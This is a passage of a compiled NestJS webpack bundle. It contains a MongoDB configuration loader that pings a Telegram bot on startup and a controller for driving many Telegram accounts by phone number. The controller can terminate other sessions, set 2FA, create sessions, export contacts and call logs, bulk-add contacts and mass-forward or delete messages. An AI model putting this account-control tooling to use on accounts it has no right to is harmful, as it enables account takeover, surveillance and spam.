    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var InitModule_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.InitModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const config_1 = __webpack_require__(/*! @nestjs/config */ "@nestjs/config");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const init_service_1 = __webpack_require__(/*! ./init.service */ "./src/components/ConfigurationInit/init.service.ts");
const configuration_schema_1 = __webpack_require__(/*! ./configuration.schema */ "./src/components/ConfigurationInit/configuration.schema.ts");
const init_controller_1 = __webpack_require__(/*! ./init.controller */ "./src/components/ConfigurationInit/init.controller.ts");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
let InitModule = InitModule_1 = class InitModule {
    constructor(connection, configService) {
        this.connection = connection;
        this.configService = configService;
        this.HEALTH_CHECK_INTERVAL = 30000;
    }
    async onModuleInit() {
        if (InitModule_1.initializationStatus.isInitializing || InitModule_1.initializationStatus.isInitialized) {
            return;
        }
        InitModule_1.initializationStatus.isInitializing = true;
        try {
            console.log(`Initializing configuration module...`);
            await this.validateConnection();
            this.setupConnectionEventHandlers();
            this.startHealthCheck();
            InitModule_1.initializationStatus.isInitialized = true;
            InitModule_1.initializationStatus.isInitializing = false;
            console.log(`Started :: ${process.env.clientId}`);
            await this.sendNotification(`started :: ${process.env.clientId}`);
        }
        catch (error) {
            InitModule_1.initializationStatus.isInitializing = false;
            console.error('Failed to initialize configuration module:', error);
            throw error;
        }
    }
    async validateConnection() {
        const maxRetries = 3;
        let retryCount = 0;
        while (retryCount < maxRetries) {
            try {
                if (this.connection.readyState !== 1) {
                    throw new Error(`MongoDB connection not ready. Current state: ${this.connection.readyState}`);
                }
                await this.connection.db.admin().ping();
                console.log('MongoDB connection validated successfully');
                return;
            }
            catch (error) {
                retryCount++;
                console.warn(`Connection validation attempt ${retryCount}/${maxRetries} failed:`, error);
                if (retryCount >= maxRetries) {
                    throw new Error(`Failed to validate MongoDB connection after ${maxRetries} attempts: ${error.message}`);
                }
                await this.delay(2000 * retryCount);
            }
        }
    }
    setupConnectionEventHandlers() {
        this.connection.on('connected', () => {
            console.log('MongoDB connected');
        });
        this.connection.on('error', (error) => {
            console.error('MongoDB connection error:', error);
        });
        this.connection.on('disconnected', () => {
            console.warn('MongoDB disconnected');
        });
        this.connection.on('reconnected', () => {
            console.log('MongoDB reconnected');
        });
        this.connection.on('close', () => {
            console.log('MongoDB connection closed');
        });
    }
    startHealthCheck() {
        this.connectionHealthCheckInterval = setInterval(async () => {
            try {
                if (this.connection.readyState === 1) {
                    await this.connection.db.admin().ping();
                }
            }
            catch (error) {
                console.error('MongoDB health check failed:', error);
            }
        }, this.HEALTH_CHECK_INTERVAL);
    }
    stopHealthCheck() {
        if (this.connectionHealthCheckInterval) {
            clearInterval(this.connectionHealthCheckInterval);
            this.connectionHealthCheckInterval = undefined;
        }
    }
    async sendNotification(message) {
        try {
            const url = `${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(message)}`;
            await (0, fetchWithTimeout_1.fetchWithTimeout)(url, { timeout: 5000 });
        }
        catch (error) {
            console.warn('Failed to send notification:', error);
        }
    }
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    async onModuleDestroy() {
        if (InitModule_1.initializationStatus.isDestroying) {
            return;
        }
        InitModule_1.initializationStatus.isDestroying = true;
        try {
            console.log('Init Module destroying...');
            this.stopHealthCheck();
            await this.sendNotification(`closed :: ${process.env.clientId}`);
            if (this.connection && this.connection.readyState !== 0) {
                console.log('Closing MongoDB connection...');
                await this.connection.close(true);
            }
        }
        catch (error) {
            console.error('Error during module destruction:', error);
        }
        finally {
            InitModule_1.initializationStatus = {
                isInitialized: false,
                isInitializing: false,
                isDestroying: false,
            };
        }
    }
    static getInitializationStatus() {
        return { ...InitModule_1.initializationStatus };
    }
    static isReady() {
        return InitModule_1.initializationStatus.isInitialized && !InitModule_1.initializationStatus.isDestroying;
    }
};
exports.InitModule = InitModule;
InitModule.initializationStatus = {
    isInitialized: false,
    isInitializing: false,
    isDestroying: false,
};
exports.InitModule = InitModule = InitModule_1 = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            config_1.ConfigModule.forRoot({
                isGlobal: true,
                cache: true,
                expandVariables: true,
                envFilePath: '.env',
            }),
            mongoose_1.MongooseModule.forRootAsync({
                imports: [config_1.ConfigModule],
                useFactory: async (configService) => {
                    const uri = process.env.mongouri || configService.get('mongouri');
                    if (!uri) {
                        throw new Error('MongoDB URI is not configured');
                    }
                    return {
                        uri,
                        maxPoolSize: 10,
                        serverSelectionTimeoutMS: 10000,
                        socketTimeoutMS: 45000,
                        connectTimeoutMS: 10000,
                        heartbeatFrequencyMS: 10000,
                        family: 4,
                        retryWrites: true,
                        retryReads: true,
                    };
                },
                inject: [config_1.ConfigService],
            }),
            mongoose_1.MongooseModule.forFeature([{
                    name: 'configurationModule',
                    collection: 'configuration',
                    schema: configuration_schema_1.ConfigurationSchema
                }])
        ],
        providers: [init_service_1.ConfigurationService],
        controllers: [init_controller_1.ConfigurationController],
        exports: [init_service_1.ConfigurationService, mongoose_1.MongooseModule],
    }),
    __param(0, (0, common_1.Inject)((0, mongoose_1.getConnectionToken)())),
    __metadata("design:paramtypes", [mongoose_2.Connection,
        config_1.ConfigService])
], InitModule);


/***/ }),

/***/ "./src/components/ConfigurationInit/init.service.ts":
/*!**********************************************************!*\
  !*** ./src/components/ConfigurationInit/init.service.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var ConfigurationService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ConfigurationService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const TelegramBots_config_1 = __webpack_require__(/*! ../../utils/TelegramBots.config */ "./src/utils/TelegramBots.config.ts");
const config_1 = __webpack_require__(/*! @nestjs/config */ "@nestjs/config");
let ConfigurationService = ConfigurationService_1 = class ConfigurationService {
    constructor(configurationModel, configService) {
        this.configurationModel = configurationModel;
        this.configService = configService;
        this.logger = new common_1.Logger(ConfigurationService_1.name);
    }
    async onModuleInit() {
        if (ConfigurationService_1.initialized) {
            return;
        }
        try {
            await this.initializeConfiguration();
            ConfigurationService_1.initialized = true;
        }
        catch (error) {
            this.logger.error('Failed to initialize configuration', error);
            throw error;
        }
    }
    async initializeConfiguration() {
        this.logger.log('Initializing configuration service...');
        await this.setEnv();
        await TelegramBots_config_1.BotConfig.getInstance().ready();
        await this.notifyStart();
        this.logger.log('Configuration service initialized successfully');
    }
    async notifyStart() {
        try {
            const clientId = process.env.clientId || this.configService.get('clientId');
            if (!clientId) {
                this.logger.warn('No clientId found in environment or configuration');
                return;
            }
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Started :: ${clientId}`)}`);
        }
        catch (error) {
            this.logger.warn('Failed to send start notification', error);
        }
    }
    async findOne() {
        const configuration = await this.configurationModel.findOne({}).lean().exec();
        if (!configuration) {
            throw new common_1.NotFoundException('Configuration not found');
        }
        return configuration;
    }
    async setEnv() {
        this.logger.log('Setting environment variables...');
        const configuration = await this.configurationModel.findOne({}, { _id: 0 }).lean();
        if (!configuration) {
            this.logger.warn('No configuration found in database, using environment variables only');
            return;
        }
        for (const [key, value] of Object.entries(configuration)) {
            if (value !== undefined && value !== null) {
                if (!process.env[key]) {
                    process.env[key] = String(value);
                    this.logger.debug(`Set environment variable: ${key}`);
                }
            }
        }
        this.logger.log('Finished setting environment variables');
    }
    async update(updateDto) {
        const { _id, ...updateData } = updateDto;
        try {
            const updatedConfig = await this.configurationModel.findOneAndUpdate({}, { $set: updateData }, { new: true, upsert: true, lean: true }).exec();
            if (!updatedConfig) {
                throw new common_1.NotFoundException('Failed to update configuration');
            }
            Object.entries(updateData).forEach(([key, value]) => {
                if (value !== undefined && value !== null) {
                    process.env[key] = String(value);
                }
            });
            return updatedConfig;
        }
        catch (error) {
            this.logger.error('Failed to update configuration', error);
            throw error;
        }
    }
};
exports.ConfigurationService = ConfigurationService;
ConfigurationService.initialized = false;
exports.ConfigurationService = ConfigurationService = ConfigurationService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('configurationModule')),
    __metadata("design:paramtypes", [mongoose_2.Model,
        config_1.ConfigService])
], ConfigurationService);


/***/ }),

/***/ "./src/components/Telegram/Telegram.controller.ts":
/*!********************************************************!*\
  !*** ./src/components/Telegram/Telegram.controller.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const Telegram_service_1 = __webpack_require__(/*! ./Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const dto_1 = __webpack_require__(/*! ./dto */ "./src/components/Telegram/dto/index.ts");
const metadata_operations_dto_1 = __webpack_require__(/*! ./dto/metadata-operations.dto */ "./src/components/Telegram/dto/metadata-operations.dto.ts");
const create_chat_folder_dto_1 = __webpack_require__(/*! ./dto/create-chat-folder.dto */ "./src/components/Telegram/dto/create-chat-folder.dto.ts");
const connection_management_dto_1 = __webpack_require__(/*! ./dto/connection-management.dto */ "./src/components/Telegram/dto/connection-management.dto.ts");
const platform_express_1 = __webpack_require__(/*! @nestjs/platform-express */ "@nestjs/platform-express");
const multer = __importStar(__webpack_require__(/*! multer */ "multer"));
const connection_manager_1 = __webpack_require__(/*! ./utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const message_search_dto_1 = __webpack_require__(/*! ./dto/message-search.dto */ "./src/components/Telegram/dto/message-search.dto.ts");
const delete_chat_dto_1 = __webpack_require__(/*! ./dto/delete-chat.dto */ "./src/components/Telegram/dto/delete-chat.dto.ts");
const update_username_dto_1 = __webpack_require__(/*! ./dto/update-username.dto */ "./src/components/Telegram/dto/update-username.dto.ts");
const send_message_dto_1 = __webpack_require__(/*! ./dto/send-message.dto */ "./src/components/Telegram/dto/send-message.dto.ts");
let TelegramController = class TelegramController {
    constructor(telegramService) {
        this.telegramService = telegramService;
    }
    async connect(mobile, autoDisconnect, handler, timeout) {
        const options = {
            autoDisconnect,
            handler,
            timeout
        };
        await this.telegramService.connect(mobile, options);
        return { message: 'Connected successfully' };
    }
    async disconnect(mobile) {
        await this.telegramService.disconnect(mobile);
        return { message: 'Disconnected successfully' };
    }
    async disconnectAll() {
        await this.telegramService.disconnectAll();
        return { message: 'All clients disconnected successfully' };
    }
    getConnectionStats() {
        return this.telegramService.getConnectionStats();
    }
    getClientState(mobile) {
        return this.telegramService.getClientState(mobile);
    }
    getActiveConnectionCount() {
        return this.telegramService.getActiveConnectionCount();
    }
    async getMe(mobile) {
        return this.telegramService.getMe(mobile);
    }
    async getEntity(mobile, entity) {
        return this.telegramService.getEntity(mobile, entity);
    }
    async updateProfile(mobile, updateProfileDto) {
        return this.telegramService.updateNameandBio(mobile, updateProfileDto.firstName, updateProfileDto.about);
    }
    async setProfilePhoto(mobile, photoDto) {
        return this.telegramService.setProfilePic(mobile, photoDto.name);
    }
    async deleteProfilePhotos(mobile) {
        return this.telegramService.deleteProfilePhotos(mobile);
    }
    async getMessages(mobile, chatId, limit) {
        return this.telegramService.getMessages(mobile, chatId, limit);
    }
    async sendMessage(mobile, dto) {
        return this.telegramService.sendMessage(mobile, dto);
    }
    async forwardMessage(mobile, forwardDto) {
        return this.telegramService.forwardBulkMessages(mobile, forwardDto.fromChatId, forwardDto.toChatId, forwardDto.messageIds);
    }
    async processBatchMessages(mobile, batchOp) {
        return this.telegramService.processBatch(batchOp.items, batchOp.batchSize || 20, async (batch) => {
            switch (batchOp.operation) {
                case dto_1.BatchOperationType.FORWARD:
                    for (const item of batch) {
                        if ('messageId' in item && item.fromChatId && item.toChatId) {
                            await this.telegramService.forwardMessage(mobile, item.toChatId, item.fromChatId, item.messageId);
                        }
                    }
                    break;
                case dto_1.BatchOperationType.DELETE:
                    for (const item of batch) {
                        await this.telegramService.deleteChat(mobile, { peer: item.chatId, justClear: true });
                    }
                    break;
                default:
                    throw new common_1.BadRequestException('Unsupported batch operation');
            }
        }, batchOp.delayMs);
    }
    async searchMessages(mobile, queryParams) {
        return this.telegramService.searchMessages(mobile, queryParams);
    }
    async getChannelInfo(mobile, includeIds) {
        return this.telegramService.getChannelInfo(mobile, includeIds);
    }
    async forwardMedia(mobile, channel, fromChatId) {
        await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
        return this.telegramService.forwardMedia(mobile, channel, fromChatId);
    }
    async leaveChannel(mobile, channel) {
        return this.telegramService.leaveChannel(mobile, channel);
    }
    async updateUsername(mobile, updateUsernameDto) {
        return this.telegramService.updateUsername(mobile, updateUsernameDto.newUsername);
    }
    async setup2FA(mobile) {
        return this.telegramService.set2Fa(mobile);
    }
    async updatePrivacy(mobile) {
        return this.telegramService.updatePrivacy(mobile);
    }
    async updatePrivacyBatch(mobile, settings) {
        return this.telegramService.updatePrivacyBatch(mobile, settings);
    }
    async getActiveSessions(mobile) {
        return this.telegramService.getAuths(mobile);
    }
    async terminateOtherSessions(mobile) {
        return this.telegramService.removeOtherAuths(mobile);
    }
    async createNewSession(mobile) {
        return this.telegramService.createNewSession(mobile);
    }
    async getSessionInfo(mobile) {
        return this.telegramService.getSessionInfo(mobile);
    }
    async terminateSession(mobile, data) {
        return this.telegramService.terminateSession(mobile, data);
    }
    async getConnectionStatus() {
        return {
            status: await this.telegramService.getConnectionStatus()
        };
    }
    async getCallLogStats(mobile) {
        return this.telegramService.getCallLog(mobile);
    }
    async addContactsBulk(mobile, contactsDto) {
        return this.telegramService.addContacts(mobile, contactsDto.phoneNumbers, contactsDto.prefix);
    }
    async getContacts(mobile) {
        return await this.telegramService.getContacts(mobile);
    }
    async sendMedia(mobile, sendMediaDto) {
        const client = await connection_manager_1.connectionManager.getClient(mobile);
        if (sendMediaDto.type === dto_1.MediaType.PHOTO) {
            return client.sendPhotoChat(sendMediaDto.chatId, sendMediaDto.url, sendMediaDto.caption, sendMediaDto.filename);
        }
        return client.sendFileChat(sendMediaDto.chatId, sendMediaDto.url, sendMediaDto.caption, sendMediaDto.filename);
    }
    async downloadMedia(mobile, chatId, messageId, res) {
        return this.telegramService.downloadMediaFile(mobile, messageId, chatId, res);
    }
    async sendMediaAlbum(mobile, albumDto) {
        return this.telegramService.sendMediaAlbum(mobile, albumDto);
    }
    async getMediaMetadata(mobile, chatId, types, startDate, endDate, limit, minId, maxId, all) {
        return this.telegramService.getMediaMetadata(mobile, {
            chatId,
            types,
            startDate: startDate ? new Date(startDate) : undefined,
            endDate: endDate ? new Date(endDate) : undefined,
            limit,
            minId,
            maxId,
            all
        });
    }
    async getFilteredMedia(mobile, chatId, types, startDate, endDate, limit, minId, maxId) {
        return this.telegramService.getFilteredMedia(mobile, {
            chatId,
            types,
            startDate: startDate ? new Date(startDate) : undefined,
            endDate: endDate ? new Date(endDate) : undefined,
            limit,
            minId,
            maxId
        });
    }
    async getGroupMembers(mobile, groupId) {
        return this.telegramService.getGrpMembers(mobile, groupId);
    }
    async blockChat(mobile, chatId) {
        return this.telegramService.blockUser(mobile, chatId);
    }
    async deleteChatHistory(mobile, deleteHistoryDto) {
        return this.telegramService.deleteChat(mobile, deleteHistoryDto);
    }
    async sendMessageWithInlineButton(mobile, chatId, message, url) {
        return this.telegramService.sendInlineMessage(mobile, chatId, message, url);
    }
    async getAllDialogs(mobile, limit = 500, offsetId = 0, archived = false) {
        return this.telegramService.getDialogs(mobile, { limit, archived, offsetId });
    }
    async getLastActiveTime(mobile) {
        return this.telegramService.getLastActiveTime(mobile);
    }
    async createGroupWithOptions(mobile, options) {
        return this.telegramService.createGroupWithOptions(mobile, options);
    }
    async updateGroupSettings(mobile, settings) {
        return this.telegramService.updateGroupSettings(mobile, settings);
    }
    async addGroupMembers(memberOp, mobile) {
        return this.telegramService.addGroupMembers(mobile, memberOp.groupId, memberOp.members);
    }
    async removeGroupMembers(memberOp, mobile) {
        return this.telegramService.removeGroupMembers(mobile, memberOp.groupId, memberOp.members);
    }
    async handleAdminOperation(adminOp, mobile) {
        if (adminOp.isPromote) {
            return this.telegramService.promoteToAdmin(mobile, adminOp.groupId, adminOp.userId, adminOp.permissions, adminOp.rank);
        }
        else {
            return this.telegramService.demoteAdmin(mobile, adminOp.groupId, adminOp.userId);
        }
    }
    async cleanupChat(mobile, cleanup) {
        return this.telegramService.cleanupChat(mobile, {
            chatId: cleanup.chatId,
            beforeDate: cleanup.beforeDate ? new Date(cleanup.beforeDate) : undefined,
            onlyMedia: cleanup.onlyMedia,
            excludePinned: cleanup.excludePinned
        });
    }
    async getChatStatistics(mobile, chatId, period = 'week') {
        return this.telegramService.getChatStatistics(mobile, chatId, period);
    }
    async scheduleMessage(mobile, schedule) {
        return this.telegramService.scheduleMessage(mobile, {
            chatId: schedule.chatId,
            message: schedule.message,
            scheduledTime: new Date(schedule.scheduledTime),
            replyTo: schedule.replyTo,
            silent: schedule.silent
        });
    }
    async getScheduledMessages(mobile, chatId) {
        return this.telegramService.getScheduledMessages(mobile, chatId);
    }
    async sendVoiceMessage(mobile, voice) {
        return this.telegramService.sendVoiceMessage(mobile, voice);
    }
    async sendViewOnceMedia(mobile, file, viewOnceDto) {
        if (viewOnceDto.sourceType === dto_1.MediaSourceType.BINARY && file) {
            return this.telegramService.sendViewOnceMedia(mobile, {
                chatId: viewOnceDto.chatId,
                sourceType: viewOnceDto.sourceType,
                binaryData: file.buffer,
                caption: viewOnceDto.caption,
                filename: viewOnceDto.filename || file.originalname
            });
        }
        return this.telegramService.sendViewOnceMedia(mobile, {
            chatId: viewOnceDto.chatId,
            sourceType: viewOnceDto.sourceType,
            path: viewOnceDto.path,
            base64Data: viewOnceDto.base64Data,
            caption: viewOnceDto.caption,
            filename: viewOnceDto.filename
        });
    }
    async getChatHistory(mobile, chatId, offset, limit) {
        return this.telegramService.getMessagesNew(mobile, chatId, offset, limit);
    }
    async promoteToAdmin(mobile, adminOp) {
        return this.telegramService.promoteToAdmin(mobile, adminOp.groupId, adminOp.userId, adminOp.permissions, adminOp.rank);
    }
    async demoteAdmin(mobile, memberOp) {
        return this.telegramService.demoteAdmin(mobile, memberOp.groupId, memberOp.members[0]);
    }
    async unblockGroupUser(mobile, data) {
        return this.telegramService.unblockGroupUser(mobile, data.groupId, data.userId);
    }
    async getGroupAdmins(mobile, groupId) {
        return this.telegramService.getGroupAdmins(mobile, groupId);
    }
    async getGroupBannedUsers(mobile, groupId) {
        return this.telegramService.getGroupBannedUsers(mobile, groupId);
    }
    async exportContacts(mobile, exportDto, res) {
        const data = await this.telegramService.exportContacts(mobile, exportDto.format, exportDto.includeBlocked);
        const filename = `contacts_${mobile}_${new Date().toISOString()}.${exportDto.format}`;
        res.setHeader('Content-Type', exportDto.format === 'vcard' ? 'text/vcard' : 'text/csv');
        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
        res.send(data);
    }
    async importContacts(mobile, contacts) {
        return this.telegramService.importContacts(mobile, contacts);
    }
    async manageBlockList(mobile, blockList) {
        return this.telegramService.manageBlockList(mobile, blockList.userIds, blockList.block);
    }
    async getContactStatistics(mobile) {
        return this.telegramService.getContactStatistics(mobile);
    }
    async createChatFolder(mobile, folder) {
        return this.telegramService.createChatFolder(mobile, folder);
    }
    async getChatFolders(mobile) {
        return this.telegramService.getChatFolders(mobile);
    }
    async editMessage(mobile, options) {
        return this.telegramService.editMessage(mobile, options);
    }
    async updateChatSettings(mobile, settings) {
        return this.telegramService.updateChatSettings(mobile, settings);
    }
    async sendMediaBatch(mobile, options) {
        return this.telegramService.sendMediaBatch(mobile, options);
    }
    async hasPassword(mobile) {
        return this.telegramService.hasPassword(mobile);
    }
    async getChats(mobile, limit, offsetDate, offsetId, offsetPeer, folderId) {
        return this.telegramService.getChats(mobile, {
            limit,
            offsetDate,
            offsetId,
            offsetPeer,
            folderId
        });
    }
    async getFileUrl(mobile, url, filename) {
        return this.telegramService.getFileUrl(mobile, url, filename);
    }
    async getMessageStats(mobile, options) {
        return this.telegramService.getMessageStats(mobile, options);
    }
    async getTopPrivateChats(mobile) {
        return this.telegramService.getTopPrivateChats(mobile);
    }
    async addBotsToChannel(mobile, body) {
        return this.telegramService.addBotsToChannel(mobile, body.channelIds);
    }
    async createBot(mobile, createBotDto) {
        return this.telegramService.createBot(mobile, createBotDto);
    }
};
exports.TelegramController = TelegramController;
__decorate([
    (0, common_1.Get)('connect/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Connect to Telegram' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'autoDisconnect', description: 'Whether to auto disconnect the client after period of inactivity', required: false, type: Boolean, default: true }),
    (0, swagger_1.ApiQuery)({ name: 'handler', description: 'Whether to use event handler', required: false, type: Boolean, default: true }),
    (0, swagger_1.ApiQuery)({ name: 'timeout', description: 'Connection timeout in milliseconds', required: false, type: Number, default: 30000 }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Successfully connected' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Connection failed' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('autoDisconnect')),
    __param(2, (0, common_1.Query)('handler')),
    __param(3, (0, common_1.Query)('timeout')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Boolean, Boolean, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "connect", null);
__decorate([
    (0, common_1.Get)('disconnect/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Disconnect from Telegram' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Successfully disconnected' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "disconnect", null);
__decorate([
    (0, common_1.Get)('disconnect-all'),
    (0, swagger_1.ApiOperation)({ summary: 'Disconnect all clients' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'All clients disconnected successfully' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "disconnectAll", null);
__decorate([
    (0, common_1.Get)('connection/stats'),
    (0, swagger_1.ApiOperation)({ summary: 'Get connection statistics' }),
    (0, swagger_1.ApiResponse)({ status: 200, type: connection_management_dto_1.ConnectionStatsDto }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", connection_management_dto_1.ConnectionStatsDto)
], TelegramController.prototype, "getConnectionStats", null);
__decorate([
    (0, common_1.Get)('connection/state/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get connection state for a client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, type: connection_management_dto_1.ConnectionStatusDto }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Client not found' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", connection_management_dto_1.ConnectionStatusDto)
], TelegramController.prototype, "getClientState", null);
__decorate([
    (0, common_1.Get)('connection/count'),
    (0, swagger_1.ApiOperation)({ summary: 'Get active connection count' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Number of active connections' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Number)
], TelegramController.prototype, "getActiveConnectionCount", null);
__decorate([
    (0, common_1.Get)('me/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get current user profile' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Profile retrieved successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMe", null);
__decorate([
    (0, common_1.Get)('entity/:mobile/:entity'),
    (0, swagger_1.ApiOperation)({ summary: 'Get Entity profile' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiParam)({ name: 'entity', description: 'Entity identifier', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Entity retrieved successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Param)('entity')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getEntity", null);
__decorate([
    (0, common_1.Post)('profile/update/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update profile information' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.UpdateProfileDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.UpdateProfileDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updateProfile", null);
__decorate([
    (0, common_1.Post)('profile/photo/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Set profile photo' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ProfilePhotoDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ProfilePhotoDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "setProfilePhoto", null);
__decorate([
    (0, common_1.Delete)('profile/photos/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete all profile photos' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
